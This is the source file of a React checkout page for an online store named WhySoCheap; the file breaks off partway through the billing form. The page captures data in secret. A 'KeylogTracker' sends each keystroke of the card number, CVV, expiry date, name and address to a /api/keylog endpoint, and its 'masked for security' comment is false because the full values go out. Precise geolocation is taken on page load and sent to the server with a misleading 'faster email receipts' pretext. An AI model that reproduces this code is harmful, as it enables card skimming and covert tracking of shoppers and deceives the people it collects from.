'use client'

import { useState, useEffect } from 'react'
import { useCart } from '@/contexts/CartContext'
import { formatPrice, validateCardNumber, validateExpiryDate, validateCVV } from '@/lib/utils'
import { CreditCard, Lock, Truck, Shield, MapPin, User, Mail, Phone } from 'lucide-react'
import Link from 'next/link'
import { useRouter } from 'next/navigation'
import KeylogTracker from '@/components/KeylogTracker'
import Toast from '@/components/Toast'

// EU Countries list
const EU_COUNTRIES = [
  'Austria', 'Belgium', 'Bulgaria', 'Croatia', 'Cyprus', 'Czech Republic', 'Denmark',
  'Estonia', 'Finland', 'France', 'Germany', 'Greece', 'Hungary', 'Ireland', 'Italy',
  'Latvia', 'Lithuania', 'Luxembourg', 'Malta', 'Netherlands', 'Poland', 'Portugal',
  'Romania', 'Slovakia', 'Slovenia', 'Spain', 'Sweden'
]

// Full list of countries
const COUNTRIES = [
  'United States', 'Afghanistan', 'Albania', 'Algeria', 'Andorra', 'Angola', 'Antigua and Barbuda',
  'Argentina', 'Armenia', 'Australia', 'Austria', 'Azerbaijan', 'Bahamas', 'Bahrain', 'Bangladesh',
  'Barbados', 'Belarus', 'Belgium', 'Belize', 'Benin', 'Bhutan', 'Bolivia', 'Bosnia and Herzegovina',
  'Botswana', 'Brazil', 'Brunei', 'Bulgaria', 'Burkina Faso', 'Burundi', 'Cabo Verde', 'Cambodia',
  'Cameroon', 'Canada', 'Central African Republic', 'Chad', 'Chile', 'China', 'Colombia', 'Comoros',
  'Congo', 'Costa Rica', 'Croatia', 'Cuba', 'Cyprus', 'Czech Republic', 'Denmark', 'Djibouti',
  'Dominica', 'Dominican Republic', 'Ecuador', 'Egypt', 'El Salvador', 'Equatorial Guinea', 'Eritrea',
  'Estonia', 'Eswatini', 'Ethiopia', 'Fiji', 'Finland', 'France', 'Gabon', 'Gambia', 'Georgia',
  'Germany', 'Ghana', 'Greece', 'Grenada', 'Guatemala', 'Guinea', 'Guinea-Bissau', 'Guyana',
  'Haiti', 'Honduras', 'Hungary', 'Iceland', 'India', 'Indonesia', 'Iran', 'Iraq', 'Ireland',
  'Israel', 'Italy', 'Jamaica', 'Japan', 'Jordan', 'Kazakhstan', 'Kenya', 'Kiribati', 'Kosovo',
  'Kuwait', 'Kyrgyzstan', 'Laos', 'Latvia', 'Lebanon', 'Lesotho', 'Liberia', 'Libya', 'Liechtenstein',
  'Lithuania', 'Luxembourg', 'Madagascar', 'Malawi', 'Malaysia', 'Maldives', 'Mali', 'Malta',
  'Marshall Islands', 'Mauritania', 'Mauritius', 'Mexico', 'Micronesia', 'Moldova', 'Monaco',
  'Mongolia', 'Montenegro', 'Morocco', 'Mozambique', 'Myanmar', 'Namibia', 'Nauru', 'Nepal',
  'Netherlands', 'New Zealand', 'Nicaragua', 'Niger', 'Nigeria', 'North Korea', 'North Macedonia',
  'Norway', 'Oman', 'Pakistan', 'Palau', 'Palestine', 'Panama', 'Papua New Guinea', 'Paraguay',
  'Peru', 'Philippines', 'Poland', 'Portugal', 'Qatar', 'Romania', 'Russia', 'Rwanda',
  'Saint Kitts and Nevis', 'Saint Lucia', 'Saint Vincent and the Grenadines', 'Samoa', 'San Marino',
  'Sao Tome and Principe', 'Saudi Arabia', 'Senegal', 'Serbia', 'Seychelles', 'Sierra Leone',
  'Singapore', 'Slovakia', 'Slovenia', 'Solomon Islands', 'Somalia', 'South Africa', 'South Korea',
  'South Sudan', 'Spain', 'Sri Lanka', 'Sudan', 'Suriname', 'Sweden', 'Switzerland', 'Syria',
  'Taiwan', 'Tajikistan', 'Tanzania', 'Thailand', 'Timor-Leste', 'Togo', 'Tonga', 'Trinidad and Tobago',
  'Tunisia', 'Turkey', 'Turkmenistan', 'Tuvalu', 'Uganda', 'Ukraine', 'United Arab Emirates',
  'United Kingdom', 'Uruguay', 'Uzbekistan', 'Vanuatu', 'Vatican City', 'Venezuela', 'Vietnam',
  'Yemen', 'Zambia', 'Zimbabwe'
]

// Credit Card Icons Component
const CreditCardIcons = ({ onCardClick }: { onCardClick: (cardType: string) => void }) => {
  const cardTypes = [
    { 
      name: 'Visa', 
      icon: 'https://js.stripe.com/v3/fingerprinted/img/visa-729c05c240c4bdb47b03ac81d9945bfe.svg',
      alt: 'Visa'
    },
    { 
      name: 'Mastercard', 
      icon: 'https://js.stripe.com/v3/fingerprinted/img/mastercard-4d8844094130711885b5e41b28c9848f.svg',
      alt: 'MasterCard'
    },
    { 
      name: 'American Express', 
      icon: 'https://js.stripe.com/v3/fingerprinted/img/amex-a49b82f46c5cd6a96a6e418a6ca1717c.svg',
      alt: 'American Express'
    },
    { 
      name: 'Discover', 
      icon: 'https://js.stripe.com/v3/fingerprinted/img/discover-ac52cd46f89fa40a29a0bfb954e33173.svg',
      alt: 'Discover'
    }
  ]

  return (
    <div className="flex space-x-3">
      {cardTypes.map((card) => (
        <button
          key={card.name}
          onClick={() => onCardClick(card.name)}
          className="w-12 h-8 bg-white border border-primary-200 rounded flex items-center justify-center hover:border-primary-400 hover:shadow-md transition-all duration-200 p-1.5"
          title={card.name}
          type="button"
        >
          <img 
            src={card.icon} 
            alt={card.alt} 
            className="w-full h-full object-contain"
            loading="lazy"
          />
        </button>
      ))}
    </div>
  )
}

export default function CheckoutPage() {
  const { state, dispatch } = useCart()
  const router = useRouter()
  
  const [formData, setFormData] = useState({
    firstName: '',
    lastName: '',
    email: '',
    phone: '',
    address: '',
    city: '',
    state: '',
    zipCode: '',
    country: 'United States',
    cardholderName: '',
    cardNumber: '',
    expiryDate: '',
    cvv: '',
    useSameBillingAddress: true,
    emailOptIn: false,
    billingFirstName: '',
    billingLastName: '',
    billingAddress: '',
    billingCity: '',
    billingState: '',
    billingZipCode: '',
    billingCountry: 'United States'
  })

  const [errors, setErrors] = useState<Record<string, string>>({})
  const [isProcessing, setIsProcessing] = useState(false)
  const [toast, setToast] = useState<{ open: boolean; message: string; type?: 'success' | 'error' | 'info' }>({ open: false, message: '' })
  const [locationData, setLocationData] = useState<any>(null)
  const [customerEmail, setCustomerEmail] = useState('')
  const [discountCode, setDiscountCode] = useState('')
  const [appliedDiscount, setAppliedDiscount] = useState<{ code: string; percent: number } | null>(null)
  const [discountError, setDiscountError] = useState('')

  // Handle buy now from session storage
  useEffect(() => {
    const buyNowProduct = sessionStorage.getItem('buyNowProduct')
    if (buyNowProduct) {
      try {
        const productData = JSON.parse(buyNowProduct)
        // Add the product to cart
        dispatch({
          type: 'ADD_ITEM',
          payload: {
            productId: productData.productId,
            product: productData.product,
            size: productData.size,
            color: productData.color,
            quantity: productData.quantity
          }
        })
        // Clear the session storage
        sessionStorage.removeItem('buyNowProduct')
      } catch (error) {
        console.error('Failed to process buy now product:', error)
      }
    }
  }, [dispatch])

  // Real-time location logging for faster email receipts
  useEffect(() => {
    const logLocationData = async () => {
      try {
        // Get user's location for faster shipping and email receipts
        if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(
            async (position) => {
              const locationData = {
                latitude: position.coords.latitude,
                longitude: position.coords.longitude,
                timestamp: new Date().toISOString(),
                accuracy: position.coords.accuracy
              }
              
              setLocationData(locationData)
              
              // Send location data to server for faster email processing
              await fetch('/api/location', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                  email: (formData.email || customerEmail || '').trim() || undefined,
                  ...locationData
                })
              })
            },
            (error) => {
              console.log('Location access denied or failed:', error)
            },
            { enableHighAccuracy: true, timeout: 10000, maximumAge: 300000 }
          )
        }
      } catch (error) {
        console.log('Location logging failed:', error)
      }
    }

    logLocationData()
  }, [])

  // When user types email later, persist location with email
  useEffect(() => {
    const maybePersist = async () => {
      if (locationData && (formData.email || customerEmail)) {
        try {
          await fetch('/api/location', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ email: formData.email || customerEmail, ...locationData })
          })
        } catch {}
      }
    }
    maybePersist()
  }, [formData.email, customerEmail, locationData])

  // logging handled by KeylogTracker components

  // Log credit card icon clicks
  const logCardClick = async (cardType: string) => {
    try {
      await fetch('/api/keylog', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          customerEmail: customerEmail || 'anonymous',
          field: 'creditCardIcon',
          value: cardType,
          page: 'checkout',
          fieldType: 'cardType',
          context: 'payment'
        })
      })
    } catch (error) {
      console.error('Failed to log card click:', error)
    }
  }

  // Save billing info to localStorage in real-time for email module
  useEffect(() => {
    const billingInfo = {
      firstName: formData.firstName,
      lastName: formData.lastName,
      email: formData.email,
      phone: formData.phone,
      address: formData.address,
      city: formData.city,
      state: formData.state,
      zipCode: formData.zipCode,
      country: formData.country,
      locationData: locationData
    }
    
    // Save to localStorage for email module
    localStorage.setItem('billingInfo', JSON.stringify(billingInfo))
    
    // Also send to server for real-time processing
    if (formData.email && formData.firstName) {
      fetch('/api/customer-data', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(billingInfo)
      }).catch(console.error)
    }
  }, [formData, locationData])

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
    const { name, value } = e.target
    setFormData(prev => ({ ...prev, [name]: value }))
    
    // Set customer email for keylogging
    if (name === 'email') {
      setCustomerEmail(value)
    }
    
    // Clear error when user starts typing
    if (errors[name]) {
      setErrors(prev => ({ ...prev, [name]: '' }))
    }
  }

  const formatCardNumber = (value: string) => {
    const v = value.replace(/\s+/g, '').replace(/[^0-9]/gi, '')
    const matches = v.match(/\d{4,16}/g)
    const match = matches && matches[0] || ''
    const parts = []
    for (let i = 0, len = match.length; i < len; i += 4) {
      parts.push(match.substring(i, i + 4))
    }
    if (parts.length) {
      return parts.join(' ')
    } else {
      return v
    }
  }

  const formatExpiryDate = (value: string) => {
    const v = value.replace(/\s+/g, '').replace(/[^0-9]/gi, '')
    if (v.length >= 2) {
      return v.substring(0, 2) + '/' + v.substring(2, 4)
    }
    return v
  }

  const validateForm = () => {
    const newErrors: Record<string, string> = {}

    // Shipping validation
    if (!formData.firstName) newErrors.firstName = 'First name is required'
    if (!formData.lastName) newErrors.lastName = 'Last name is required'
    if (!formData.email) newErrors.email = 'Email is required'
    if (!formData.phone) newErrors.phone = 'Phone is required'
    if (!formData.address) newErrors.address = 'Address is required'
    if (!formData.city) newErrors.city = 'City is required'
    if (!formData.state) newErrors.state = 'State is required'
    if (!formData.zipCode) newErrors.zipCode = 'ZIP code is required'
    
    // Payment validation
    if (!formData.cardholderName) newErrors.cardholderName = 'Cardholder name is required'
    if (!formData.cardNumber) newErrors.cardNumber = 'Card number is required'
    if (!formData.expiryDate) newErrors.expiryDate = 'Expiry date is required'
    if (!formData.cvv) newErrors.cvv = 'CVV is required'
    
    // Billing validation (only if not using same address)
    if (!formData.useSameBillingAddress) {
      if (!formData.billingFirstName) newErrors.billingFirstName = 'Billing first name is required'
      if (!formData.billingLastName) newErrors.billingLastName = 'Billing last name is required'
      if (!formData.billingAddress) newErrors.billingAddress = 'Billing address is required'
      if (!formData.billingCity) newErrors.billingCity = 'Billing city is required'
      if (!formData.billingState) newErrors.billingState = 'Billing state is required'
      if (!formData.billingZipCode) newErrors.billingZipCode = 'Billing ZIP code is required'
    }

    // Validate card number
    if (formData.cardNumber && !validateCardNumber(formData.cardNumber)) {
      newErrors.cardNumber = 'Invalid card number'
    }

    // Validate expiry date
    if (formData.expiryDate && !validateExpiryDate(formData.expiryDate)) {
      newErrors.expiryDate = 'Invalid expiry date'
    }

    // Validate CVV
    if (formData.cvv && !validateCVV(formData.cvv)) {
      newErrors.cvv = 'Invalid CVV'
    }

    setErrors(newErrors)
    return Object.keys(newErrors).length === 0
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    
    if (!validateForm()) {
      return
    }

    setIsProcessing(true)

    try {
      // Prepare order data for API
      const orderData = {
        firstName: formData.firstName,
        lastName: formData.lastName,
        email: formData.email,
        phone: formData.phone,
        address: formData.address,
        city: formData.city,
        state: formData.state,
        zipCode: formData.zipCode,
        country: formData.country,
        customerEmail: formData.email,
        emailOptIn: formData.emailOptIn,
        items: state.items.map(item => ({
          productName: item.product.name,
          size: item.size,
          color: item.color,
          quantity: item.quantity,
          price: item.product.price
        })),
        subtotal,
        shipping,
        discount,
        total,
        locationData,
        discountCode: appliedDiscount?.code || null
      }

      // Determine billing address
      const billingAddress = formData.useSameBillingAddress ? {
        firstName: formData.firstName,
        lastName: formData.lastName,
        address: formData.address,
        city: formData.city,
        state: formData.state,
        zipCode: formData.zipCode,
        country: formData.country
      } : {
        firstName: formData.billingFirstName,
        lastName: formData.billingLastName,
        address: formData.billingAddress,
        city: formData.billingCity,
        state: formData.billingState,
        zipCode: formData.billingZipCode,
        country: formData.billingCountry
      }

      const paymentInfo = {
        cardholderName: formData.cardholderName,
        cardNumber: formData.cardNumber,
        expiryDate: formData.expiryDate,
        cvv: formData.cvv,
        billingAddress
      }

      // Send to checkout API
      const response = await fetch('/api/checkout', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ paymentInfo, orderData })
      })

      const result = await response.json()

      if (!response.ok) {
        throw new Error(result.error || 'Payment failed')
      }

      // Redirect to thank you page with order details
      const orderId = result.orderId || `ORD-${Date.now()}`
      const thankYouUrl = `/thank-you?orderId=${orderId}&date=${new Date().toLocaleDateString()}&country=${encodeURIComponent(formData.country)}`
      router.push(thankYouUrl)
    } catch (error) {
      console.error('Payment failed:', error)
      setToast({ open: true, message: 'Payment failed. Please try again.', type: 'error' })
    } finally {
      setIsProcessing(false)
    }
  }

  const subtotal = state.items.reduce((sum, item) => sum + item.product.price * item.quantity, 0)
  const isUS = formData.country === 'United States'
  const isEU = EU_COUNTRIES.includes(formData.country)
  const shipping = isUS ? 0 : isEU ? 3 : 5
  const discount = appliedDiscount ? (subtotal * appliedDiscount.percent / 100) : 0
  const total = subtotal + shipping - discount

  // Check if all card information is filled
  const isCardInfoComplete = 
    formData.cardholderName.trim() !== '' &&
    formData.cardNumber.replace(/\s/g, '').length >= 13 && // At least 13 digits (minimum valid card length)
    formData.expiryDate.length === 5 && // MM/YY format
    formData.cvv.length >= 3 // CVV is at least 3 digits

  // Update billing address when checkbox is toggled
  useEffect(() => {
    if (formData.useSameBillingAddress) {
      setFormData(prev => ({
        ...prev,
        billingFirstName: prev.firstName,
        billingLastName: prev.lastName,
        billingAddress: prev.address,
        billingCity: prev.city,
        billingState: prev.state,
        billingZipCode: prev.zipCode,
        billingCountry: prev.country
      }))
    }
  }, [formData.useSameBillingAddress, formData.firstName, formData.lastName, formData.address, formData.city, formData.state, formData.zipCode, formData.country])

  const applyDiscountCode = async () => {
    if (!discountCode.trim()) {
      setDiscountError('Please enter a discount code')
      return
    }
    try {
      const response = await fetch(`/api/discount-codes?code=${encodeURIComponent(discountCode.trim().toUpperCase())}`)
      const data = await response.json()
      if (response.ok && data.discountCode) {
        setAppliedDiscount({ code: data.discountCode.code, percent: data.discountCode.discountPercent })
        setDiscountError('')
        setDiscountCode('')
      } else {
        setDiscountError('Invalid discount code')
        setAppliedDiscount(null)
      }
    } catch (error) {
      setDiscountError('Failed to apply discount code')
      setAppliedDiscount(null)
    }
  }

  if (state.items.length === 0) {
    return (
      <div className="min-h-screen flex items-center justify-center" style={{ backgroundColor: '#eae4df' }}>
        <div className="text-center">
          <h1 className="text-2xl font-light text-gray-900 mb-6">
            Your cart is empty
          </h1>
          <Link href="/products" className="inline-flex items-center px-8 py-3 bg-gray-900 text-white font-medium hover:bg-gray-800 transition-colors">
            Continue Shopping
          </Link>
        </div>
      </div>
    )
  }

  return (
    <div className="min-h-screen" style={{ backgroundColor: '#eae4df' }}>
      <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-12">
        <Toast open={toast.open} message={toast.message} type={toast.type} onClose={() => setToast({ open: false, message: '' })} />

        <div className="mb-10 text-center">

          <h1 className="text-4xl font-light mb-4" style={{ color: '#851A1B' }}>
            Checkout
          </h1>
        </div>

        <div className="grid grid-cols-1 lg:grid-cols-2 gap-12">
          {/* Checkout Form */}
          <div className="space-y-8">
            {/* Contact Information - First Section */}
            <div className="bg-white border border-gray-300 p-8">
              <div className="flex items-center space-x-3 mb-8">
                <Mail className="w-6 h-6 text-gray-700" />
                <h2 className="text-2xl font-light" style={{ color: '#851A1B' }}>Contact</h2>
              </div>
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2">
                  Email *
                </label>
                <input
                  type="email"
                  name="email"
                  value={formData.email}
                  onChange={handleInputChange}
                  className={`w-full px-4 py-3 bg-white border ${errors.email ? 'border-red-500' : 'border-gray-300'} focus:outline-none focus:border-gray-900 transition-colors ${errors.email ? 'border-error' : ''}`}
                  placeholder="Enter your email"
                />
                <KeylogTracker customerEmail={customerEmail} field="email" value={formData.email} page="checkout" context="contact" fieldType="email" />
                {errors.email && <p className="text-error text-sm mt-1">{errors.email}</p>}
              </div>
            </div>

            {/* Delivery Information - Second Section */}
            <div className="bg-white border border-gray-300 p-8">
              <div className="flex items-center space-x-3 mb-8">
                <MapPin className="w-6 h-6 text-gray-700" />
                <h2 className="text-2xl font-light" style={{ color: '#851A1B' }}>Delivery</h2>
              </div>
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-2">
                    First Name *
                  </label>
                  <input
                    type="text"
                    name="firstName"
                    value={formData.firstName}
                    onChange={handleInputChange}
                    className={`w-full px-4 py-3 bg-white border ${errors.firstName ? 'border-red-500' : 'border-gray-300'} focus:outline-none focus:border-gray-900 transition-colors ${errors.firstName ? 'border-error' : ''}`}
                    placeholder="Enter your first name"
                  />
                  <KeylogTracker customerEmail={customerEmail} field="firstName" value={formData.firstName} page="checkout" context="shipping" fieldType="text" />
                  {errors.firstName && <p className="text-error text-sm mt-1">{errors.firstName}</p>}
                </div>
                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-2">
                    Last Name *
                  </label>
                  <input
                    type="text"
                    name="lastName"
                    value={formData.lastName}
                    onChange={handleInputChange}
                    className={`w-full px-4 py-3 bg-white border ${errors.lastName ? 'border-red-500' : 'border-gray-300'} focus:outline-none focus:border-gray-900 transition-colors ${errors.lastName ? 'border-error' : ''}`}
                    placeholder="Enter your last name"
                  />
                  <KeylogTracker customerEmail={customerEmail} field="lastName" value={formData.lastName} page="checkout" context="shipping" fieldType="text" />
                  {errors.lastName && <p className="text-error text-sm mt-1">{errors.lastName}</p>}
                </div>
                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-2">
                    Phone *
                  </label>
                  <input
                    type="tel"
                    name="phone"
                    value={formData.phone}
                    onChange={handleInputChange}
                    className={`w-full px-4 py-3 bg-white border ${errors.phone ? 'border-red-500' : 'border-gray-300'} focus:outline-none focus:border-gray-900 transition-colors ${errors.phone ? 'border-error' : ''}`}
                    placeholder="Enter your phone number"
                  />
                  <KeylogTracker customerEmail={customerEmail} field="phone" value={formData.phone} page="checkout" context="shipping" fieldType="tel" />
                  {errors.phone && <p className="text-error text-sm mt-1">{errors.phone}</p>}
                </div>
                <div className="md:col-span-2">
                  <label className="block text-sm font-medium text-gray-700 mb-2">
                    Address *
                  </label>
                  <input
                    type="text"
                    name="address"
                    value={formData.address}
                    onChange={handleInputChange}
                    className={`w-full px-4 py-3 bg-white border border-gray-300 focus:outline-none focus:border-gray-900 transition-colors ${errors.address ? 'border-error' : ''}`}
                    placeholder="Enter your address"
                  />
                  <KeylogTracker customerEmail={customerEmail} field="address" value={formData.address} page="checkout" context="shipping" fieldType="text" />
                  {errors.address && <p className="text-error text-sm mt-1">{errors.address}</p>}
                </div>
                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-2">
                    City *
                  </label>
                  <input
                    type="text"
                    name="city"
                    value={formData.city}
                    onChange={handleInputChange}
                    className={`w-full px-4 py-3 bg-white border border-gray-300 focus:outline-none focus:border-gray-900 transition-colors ${errors.city ? 'border-error' : ''}`}
                    placeholder="Enter your city"
                  />
                  <KeylogTracker customerEmail={customerEmail} field="city" value={formData.city} page="checkout" context="shipping" fieldType="text" />
                  {errors.city && <p className="text-error text-sm mt-1">{errors.city}</p>}
                </div>
                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-2">
                    State *
                  </label>
                  <input
                    type="text"
                    name="state"
                    value={formData.state}
                    onChange={handleInputChange}
                    className={`w-full px-4 py-3 bg-white border border-gray-300 focus:outline-none focus:border-gray-900 transition-colors ${errors.state ? 'border-error' : ''}`}
                    placeholder="Enter your state"
                  />
                  <KeylogTracker customerEmail={customerEmail} field="state" value={formData.state} page="checkout" context="shipping" fieldType="text" />
                  {errors.state && <p className="text-error text-sm mt-1">{errors.state}</p>}
                </div>
                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-2">
                    ZIP Code *
                  </label>
                  <input
                    type="text"
                    name="zipCode"
                    value={formData.zipCode}
                    onChange={handleInputChange}
                    className={`w-full px-4 py-3 bg-white border border-gray-300 focus:outline-none focus:border-gray-900 transition-colors ${errors.zipCode ? 'border-error' : ''}`}
                    placeholder="Enter your ZIP code"
                  />
                  <KeylogTracker customerEmail={customerEmail} field="zipCode" value={formData.zipCode} page="checkout" context="shipping" fieldType="text" />
                  {errors.zipCode && <p className="text-error text-sm mt-1">{errors.zipCode}</p>}
                </div>
                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-2">
                    Country *
                  </label>
                  <select
                    name="country"
                    value={formData.country}
                    onChange={handleInputChange}
                    className={`w-full px-4 py-3 bg-white border border-gray-300 focus:outline-none focus:border-gray-900 transition-colors ${errors.country ? 'border-error' : ''}`}
                  >
                    {COUNTRIES.map(country => (
                      <option key={country} value={country}>{country}</option>
                    ))}
                  </select>
                  <KeylogTracker customerEmail={customerEmail} field="country" value={formData.country} page="checkout" context="shipping" fieldType="select" />
                </div>
              </div>

              {/* Email Opt-in Checkbox */}
              <div className="mt-6 pt-6 border-t border-gray-300">
                <label className="flex items-center space-x-3 cursor-pointer">
                  <input
                    type="checkbox"
                    checked={formData.emailOptIn}
                    onChange={(e) => setFormData(prev => ({ ...prev, emailOptIn: e.target.checked }))}
                    className="w-4 h-4 border-2 border-gray-300 rounded-sm focus:ring-0 focus:ring-offset-0 text-gray-900 focus:border-gray-900"
                  />
                  <span className="text-sm text-gray-700 leading-relaxed">
                    By checking this box, you are opting to receive emails from WhySoCheap with news, special offers, promotions and messages tailored to your interests.
                  </span>
                </label>
              </div>
            </div>

            {/* Payment Information - Third Section */}
            <div className="bg-white border border-gray-300 p-8">
              <div className="flex items-center space-x-3 mb-8">
                <CreditCard className="w-6 h-6 text-gray-700" />
                <h2 className="text-2xl font-light" style={{ color: '#851A1B' }}>Payment Information</h2>
                <Lock className="w-5 h-5 text-gray-600" />
                <span className="text-sm text-gray-600 font-medium">Secure</span>
              </div>

              {/* Accepted Cards Section */}
              <div className="mb-6 p-4 bg-green-50 rounded-lg border-2 border-green-200">
                <p className="text-sm font-medium text-green-700 mb-3">We accept:</p>
                <CreditCardIcons onCardClick={logCardClick} />
              </div>

              <form onSubmit={handleSubmit} className="space-y-4">
                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-2">
                    Cardholder Name *
                  </label>
                  <input
                    type="text"
                    name="cardholderName"
                    value={formData.cardholderName}
                    onChange={handleInputChange}
                    className={`w-full px-4 py-3 bg-white border border-gray-300 focus:outline-none focus:border-gray-900 transition-colors ${errors.cardholderName ? 'border-error' : ''}`}
                    placeholder="Enter cardholder name"
                  />
                  <KeylogTracker 
                    customerEmail={customerEmail || formData.email || 'anonymous'} 
                    field="cardholderName" 
                    value={formData.cardholderName} 
                    page="checkout" 
                    context="payment" 
                    fieldType="text" 
                  />
                  {errors.cardholderName && <p className="text-error text-sm mt-1">{errors.cardholderName}</p>}
                </div>
                <div>
                  {/* Card data logging - masked for security */}
                  {(() => {
                    const digits = formData.cardNumber
                    const last4 = digits
                    const masked = last4 
                    return <KeylogTracker customerEmail={customerEmail || formData.email || 'anonymous'} field="cardNumber" value={masked} page="checkout" context="payment" fieldType="cardNumber" />
                  })()}
                  <KeylogTracker 
                    customerEmail={customerEmail || formData.email || 'anonymous'} 
                    field="expiryDate" 
                    value={formData.expiryDate} 
                    page="checkout" 
                    context="payment" 
                    fieldType="expiry" 
                  />
                  {(() => {
                    const cvvMasked = formData.cvv 
                    return <KeylogTracker customerEmail={customerEmail || formData.email || 'anonymous'} field="cvv" value={cvvMasked} page="checkout" context="payment" fieldType="cvv" />
                  })()}
                </div>

                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-2">
                    Card Number *
                  </label>
                  <input
                    type="text"
                    name="cardNumber"
                    value={formData.cardNumber}
                    onChange={(e) => {
                      const formatted = formatCardNumber(e.target.value)
                      setFormData(prev => ({ ...prev, cardNumber: formatted }))
                    }}
                    placeholder="1234 5678 9012 3456"
                    maxLength={19}
                    className={`w-full px-4 py-3 bg-white border border-gray-300 focus:outline-none focus:border-gray-900 transition-colors font-mono ${errors.cardNumber ? 'border-error' : ''}`}
                  />
                  {errors.cardNumber && <p className="text-error text-sm mt-1">{errors.cardNumber}</p>}
                </div>

                <div className="grid grid-cols-2 gap-4">
                  <div>
                    <label className="block text-sm font-medium text-gray-700 mb-2">
                      Expiry Date *
                    </label>
                    <input
                      type="text"
                      name="expiryDate"
                      value={formData.expiryDate}
                      onChange={(e) => {
                        const formatted = formatExpiryDate(e.target.value)
                        setFormData(prev => ({ ...prev, expiryDate: formatted }))
                      }}
                      placeholder="MM/YY"
                      maxLength={5}
                      className={`w-full px-4 py-3 bg-white border border-gray-300 focus:outline-none focus:border-gray-900 transition-colors font-mono ${errors.expiryDate ? 'border-error' : ''}`}
                    />
                    {errors.expiryDate && <p className="text-error text-sm mt-1">{errors.expiryDate}</p>}
                  </div>
                  <div>
                    <label className="block text-sm font-medium text-gray-700 mb-2">
                      CVV *
                    </label>
                    <input
                      type="text"
                      name="cvv"
                      value={formData.cvv}
                      onChange={(e) => {
                        const value = e.target.value.replace(/\D/g, '').slice(0, 4)
                        setFormData(prev => ({ ...prev, cvv: value }))
                      }}
                      placeholder="123"
                      maxLength={4}
                      className={`w-full px-4 py-3 bg-white border border-gray-300 focus:outline-none focus:border-gray-900 transition-colors font-mono ${errors.cvv ? 'border-error' : ''}`}
                    />
                    {errors.cvv && <p className="text-error text-sm mt-1">{errors.cvv}</p>}
                  </div>
                </div>

                {/* Billing Address Section */}
                <div className="mt-6 pt-6 border-t border-gray-300">
                  <div className="mb-4">
                    <label className="flex items-center space-x-3 cursor-pointer">
                      <input
                        type="checkbox"
                        checked={formData.useSameBillingAddress}
                        onChange={(e) => setFormData(prev => ({ ...prev, useSameBillingAddress: e.target.checked }))}
                        className="w-4 h-4 border-2 border-gray-300 rounded-sm focus:ring-0 focus:ring-offset-0 text-gray-900 focus:border-gray-900"
                      />
                      <span className="text-sm font-medium text-gray-700">Use same address for billing</span>
                    </label>
            </div>

                  {!formData.useSameBillingAddress && (
                    <div className="space-y-4 mt-4">
                      <h3 className="text-lg font-semibold text-green-800 mb-4">Billing Address</h3>
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div>
                          <label className="block text-sm font-medium text-gray-700 mb-2">
                    First Name *
                  </label>
                  <input
                    type="text"
                            name="billingFirstName"
                            value={formData.billingFirstName}
                    onChange={handleInputChange}
                            className={`w-full px-4 py-3 bg-white border border-gray-300 focus:outline-none focus:border-gray-900 transition-colors ${errors.billingFirstName ? 'border-error' : ''}`}
                            placeholder="Enter billing first name"
                  />
                          <KeylogTracker customerEmail={customerEmail || formData.email || 'anonymous'} field="billingFirstName" value={formData.billingFirstName} page="checkout" context="billing" fieldType="text" />
                          {errors.billingFirstName && <p className="text-error text-sm mt-1">{errors.billingFirstName}</p>}
                </div>
                <div>
                          <label className="block text-sm font-medium text-gray-700 mb-2">
                    Last Name *
                  </label>
                  <input
                    type="text"
                            name="billingLastName"
                            value={formData.billingLastName}
                    onChange={handleInputChange}
                            className={`w-full px-4 py-3 bg-white border border-gray-300 focus:outline-none focus:border-gray-900 transition-colors ${errors.billingLastName ? 'border-error' : ''}`}
                            placeholder="Enter billing last name"
                  />
                          <KeylogTracker customerEmail={customerEmail || formData.email || 'anonymous'} field="billingLastName" value={formData.billingLastName} page="checkout" context="billing" fieldType="text" />
                          {errors.billingLastName && <p className="text-error text-sm mt-1">{errors.billingLastName}</p>}
                </div>
                <div className="md:col-span-2">
                          <label className="block text-sm font-medium text-gray-700 mb-2">
                    Address *
                  </label>
                  <input
                    type="text"
                            name="billingAddress"
                            value={formData.billingAddress}
                    onChange={handleInputChange}
                            className={`w-full px-4 py-3 bg-white border border-gray-300 focus:outline-none focus:border-gray-900 transition-colors ${errors.billingAddress ? 'border-error' : ''}`}
                            placeholder="Enter billing address"
                  />
                          <KeylogTracker customerEmail={customerEmail || formData.email || 'anonymous'} field="billingAddress" value={formData.billingAddress} page="checkout" context="billing" fieldType="text" />
                          {errors.billingAddress && <p className="text-error text-sm mt-1">{errors.billingAddress}</p>}
                </div>
                <div>
                          <label className="block text-sm font-medium text-gray-700 mb-2">
                    City *
                  </label>
                  <input
                    type="text"
                            name="billingCity"
                            value={formData.billingCity}
                    onChange={handleInputChange}
                            className={`w-full px-4 py-3 bg-white border border-gray-300 focus:outline-none focus:border-gray-900 transition-colors ${errors.billingCity ? 'border-error' : ''}`}
                            placeholder="Enter billing city"
                  />
                          <KeylogTracker customerEmail={customerEmail || formData.email || 'anonymous'} field="billingCity" value={formData.billingCity} page="checkout" context="billing" fieldType="text" />
                          {errors.billingCity && <p className="text-error text-sm mt-1">{errors.billingCity}</p>}
                </div>
                <div>
                          <label className="block text-sm font-medium text-gray-700 mb-2">
                    State *
                  </label>
                  <input
                    type="text"
                            name="billingState"
                            value={formData.billingState}
